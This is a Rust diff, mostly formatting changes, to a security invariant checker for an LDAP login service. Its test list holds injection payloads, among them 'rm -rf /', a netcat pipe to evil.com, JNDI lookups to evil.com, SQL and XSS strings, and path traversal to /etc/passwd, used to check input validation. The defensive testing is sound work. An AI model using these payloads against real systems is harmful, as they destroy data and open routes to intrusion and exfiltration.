@@ -1,6 +1,5 @@
 /// Security invariant checking macros and functions
 /// These ensure that critical security properties always hold true
-
 use crate::error::{Error, Result};
 use std::time::Duration;
 use tracing::{error, warn};
@@ -45,11 +44,11 @@ macro_rules! ensure_timing_consistency {
         let start = std::time::Instant::now();
         let result = $operation;
         let elapsed = start.elapsed();
-        
+
         if elapsed < $min_duration {
             tokio::time::sleep($min_duration - elapsed).await;
         }
-        
+
         result
     }};
 }
@@ -125,11 +124,11 @@ impl SecurityInvariantChecker {
         // This would be called in an async context in practice
         // For now, we just verify the rate limiter exists and is configured
         use crate::services::ldap_connection_pool::AuthRateLimiter;
-        
+
         let _rate_limiter = AuthRateLimiter::new(5, Duration::from_secs(300));
         // Invariant: Rate limiter must be properly initialized
         security_invariant!(true, "Rate limiter initialization check passed");
-        
+
         Ok(())
     }
 
@@ -144,11 +143,11 @@ impl SecurityInvariantChecker {
     /// Check audit logging invariants
     pub fn check_audit_logging_invariants() -> Result<()> {
         use crate::services::security_audit_service::SecurityAuditService;
-        
+
         // Invariant: Audit service must be properly initialized
         let _audit_service = SecurityAuditService::new(100);
         security_invariant!(true, "Audit logging initialization check passed");
-        
+
         Ok(())
     }
 
@@ -162,30 +161,24 @@ impl SecurityInvariantChecker {
             ("LDAP", "admin)(|(objectClass=*)"),
             ("LDAP", "admin)(&(objectClass=*)"),
             ("LDAP", "admin)(uid=*)"),
-            
             // SQL injection
             ("SQL", "admin'; DROP TABLE users; --"),
             ("SQL", "admin' OR '1'='1"),
             ("SQL", "admin' UNION SELECT * FROM users --"),
-            
             // XSS
             ("XSS", "<script>alert('xss')</script>"),
             ("XSS", "<img src=x onerror=alert('xss')>"),
             ("XSS", "javascript:alert('xss')"),
-            
             // Command injection
             ("Command", "admin; rm -rf /"),
             ("Command", "admin | nc evil.com 1337"),
             ("Command", "admin && ping evil.com"),
-            
             // Path traversal
             ("Path", "../../../etc/passwd"),
             ("Path", "..\\..\\..\\windows\\system32\\config\\sam"),
-            
             // JNDI injection
             ("JNDI", "${jndi:ldap://evil.com/a}"),
             ("JNDI", "${jndi:rmi://evil.com/a}"),
-            
             // Null byte injection
             ("Null", "admin\x00"),
             ("Null", "admin\x00.txt"),
@@ -216,7 +209,9 @@ impl SecurityInvariantChecker {
         ];
 
         for input in malicious_inputs {
-            if let Err(Error::InvalidArgument(msg)) = InputValidationService::validate_username(input) {
+            if let Err(Error::InvalidArgument(msg)) =
+                InputValidationService::validate_username(input)
+            {
                 // Invariant: Error messages must not leak detection information
                 security_invariant!(
                     !msg.contains("SQL"),
@@ -273,7 +268,7 @@ impl SecurityInvariantChecker {
                         value
                     );
                 }
-                
+
                 if key.contains("TIMEOUT") {
                     if let Ok(timeout) = value.parse::<u64>() {
                         security_invariant!(
@@ -293,8 +288,8 @@ impl SecurityInvariantChecker {
     /// Check that all security services are properly initialized
     pub fn check_security_services_initialization() -> Result<()> {
         use crate::services::input_validation_service::InputValidationService;
-        use crate::services::security_audit_service::SecurityAuditService;
         use crate::services::ldap_connection_pool::AuthRateLimiter;
+        use crate::services::security_audit_service::SecurityAuditService;
 
         // Invariant: All security services must be initializable
         let _input_validator = InputValidationService::validate_username("test");
@@ -328,7 +323,9 @@ impl RuntimeSecurityMonitor {
             Ok(_) => report.error_handling_status = SecurityStatus::Healthy,
             Err(e) => {
                 report.error_handling_status = SecurityStatus::Critical;
-                report.issues.push(format!("Error message security issue: {:?}", e));
+                report
+                    .issues
+                    .push(format!("Error message security issue: {:?}", e));
             }
         }
 
@@ -346,7 +343,9 @@ impl RuntimeSecurityMonitor {
             Ok(_) => report.services_status = SecurityStatus::Healthy,
             Err(e) => {
                 report.services_status = SecurityStatus::Critical;
-                report.issues.push(format!("Service initialization issue: {:?}", e));
+                report
+                    .issues
+                    .push(format!("Service initialization issue: {:?}", e));
             }
         }
 
